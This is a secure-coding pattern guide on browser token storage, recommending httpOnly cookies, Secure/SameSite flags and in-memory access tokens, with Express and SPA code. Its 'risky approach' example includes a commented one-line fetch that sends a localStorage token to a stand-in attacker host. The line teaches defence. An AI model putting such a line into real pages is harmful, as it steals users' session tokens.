# Secure Token Storage

> **Contents:** Metadata · TLDR · Notes (state in 2026, corrections to the source) · Problem · Solution · Code examples · Advantages · Disadvantages / tradeoffs · Related patterns · When to use / when NOT to use

Source: frontendpatterns.dev/secure-token-storage.

## Metadata

Category: Security. Level: Advanced. Framework: Native web. Author: Den Odell. Last updated:
21 June 2026.

## TLDR

Never store long-lived authentication tokens in `localStorage`/`sessionStorage` — use
httpOnly cookies for session/refresh tokens and an in-memory access token for an SPA.

## Notes (state in 2026, corrections to the source)

- The IETF recommendation "OAuth 2.0 for Browser-Based Apps" (2025): the safest is the **BFF** pattern
  (Backend-for-Frontend) — OAuth tokens never reach the browser at all, and the SPA has only an
  `HttpOnly; Secure; SameSite` session cookie to its own backend. A token in memory (the example below) is a compromise for an SPA without a BFF.
- XSS in an application with a token in memory can still make requests on behalf of the user — this limits token
  theft, not the consequences of XSS.
- Many parallel 401s → one refresh: keep a shared `refreshPromise` promise, otherwise a race of
  refresh tokens (with rotation) will log the user out.
- The server side (issuing, rotation, JWT) — be-auth-security.

## Problem

Storing authentication tokens in `localStorage` or `sessionStorage` is a serious
security threat. Anything stored in `localStorage`/`sessionStorage` is readable
by **any** JavaScript running on the page — this includes malicious scripts injected
through XSS, compromised analytics tags or browser extensions. A single line of code
is enough for the token to reach the attacker's server, while the user remains unaware.

## Solution

A three-layer protection model:

1. **httpOnly cookies** for session and refresh tokens — invisible to JavaScript, sent
   automatically by the browser.
2. **The `Secure` and `SameSite` flags** — transmission only over HTTPS + protection against CSRF.
3. **An in-memory access token** for an SPA — a short-lived token kept in a closure
   variable, never on disk.

## Code examples

### The risky approach (to avoid)

```javascript
// DON'T DO THIS. localStorage is readable by any JavaScript on the page,
// so a single XSS bug or compromised third-party script can steal the token.
localStorage.setItem('token', jwt);

// An injected attacker script needs just one line:
//   fetch('https://evil.example/steal?t=' + localStorage.getItem('token'));
```

### Setting an httpOnly cookie on the server (Express.js)

```javascript
// Express route handler
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);
  const token = signSessionToken(user);

  res.cookie('session', token, {
    httpOnly: true,        // invisible to JavaScript, so XSS cannot read it
    secure: true,          // only sent over HTTPS
    sameSite: 'strict',    // not sent on cross-site requests (CSRF defense)
    maxAge: 1000 * 60 * 60, // expires in 1 hour
    path: '/',
  });

  res.json({ ok: true });
});

// On later requests the browser sends the cookie automatically.
// The server reads it from req.cookies.session to authenticate.
```

### An access token in memory (SPA client)

```javascript
// auth.js — the access token lives only in this closure variable,
// never in localStorage or sessionStorage.
let accessToken = null;

export function setAccessToken(token) {
  accessToken = token;
}

// Ask the server for a new access token. The httpOnly refresh cookie
// is sent automatically because of `credentials: 'include'`.
export async function refreshAccessToken() {
  const res = await fetch('/api/refresh', {
    method: 'POST',
    credentials: 'include',
  });
  if (!res.ok) throw new Error('Session expired');
  const { token } = await res.json();
  accessToken = token;
  return token;
}

// A fetch wrapper that attaches the in-memory token and refreshes once on 401.
export async function authedFetch(url, options = {}) {
  if (!accessToken) await refreshAccessToken();

  let res = await fetch(url, {
    ...options,
    headers: { ...options.headers, Authorization: `Bearer ${accessToken}` },
  });

  if (res.status === 401) {
    await refreshAccessToken();
    res = await fetch(url, {
      ...options,
      headers: { ...options.headers, Authorization: `Bearer ${accessToken}` },
    });
  }

  return res;
}
```

## Advantages

- httpOnly cookies are inaccessible to scripts — XSS attacks cannot read the token directly.
- Automatic sending by the browser eliminates manual token management on the client side.
- The `Secure` flag protects the transmission, `SameSite` blocks typical CSRF vectors.
- An in-memory access token limits the XSS exposure window to the few minutes of the token's validity.
- The refresh token is never reachable for injected scripts.
- A page reload clears the token from memory — a session stolen (e.g. through inspection) does not
  leave a usable persistent token.
- Integration with standard backend frameworks is simple.

## Disadvantages / tradeoffs

- Requires control over the backend and a dedicated authentication endpoint (`/api/refresh`).
- CSRF protection is still necessary (flags, tokens, double-submit) — cookies solve token
  theft, not request forgery.
- The access token is lost on a page reload — a silent refresh mechanism
  must be built.
- Local testing is complicated by the HTTPS requirement of the `Secure` flag.
- The cookie size limit (~4 KB) can cause an overflow with large tokens.
- Cross-domain interfaces require `SameSite=None; Secure` and a correct CORS configuration.
- Mobile applications and non-browser clients do not get automatic cookie handling —
  they require a different scheme.
- An in-memory access token still requires defence against XSS (output encoding, CSP, trusted
  dependencies) — it reduces the risk window, it does not eliminate it completely.

## Related patterns

- CSRF Protection — Security (`csrf-protection.md`)
- SameSite Cookie — Security (`samesite-cookie.md`)
- See also be-auth-security — the section on JWT/the algorithm and
  timing-safe comparison concerns the backend that issues these tokens; this file concerns storing
  them on the frontend side.
- External: Web Storage Security (MDN), JWT Storage Best Practices (Auth0), Secure Cookie
  Attributes (OWASP).

## When to use / when NOT to use

Apply an httpOnly cookie + an in-memory access token **always** when you build your own session
authentication for a web application with the browser as the client — this is today's recommended standard,
not one of the options to consider. Do **not** apply this pattern 1:1 to mobile/native
API clients without a browser — there cookies are not a natural transport mechanism and a different
model is needed (e.g. the operating system's secure storage + refresh token rotation). If the project
already uses an external identity provider (Auth0, Clerk, Firebase Auth) — first check what
storage model it imposes/recommends, instead of building it yourself from scratch.
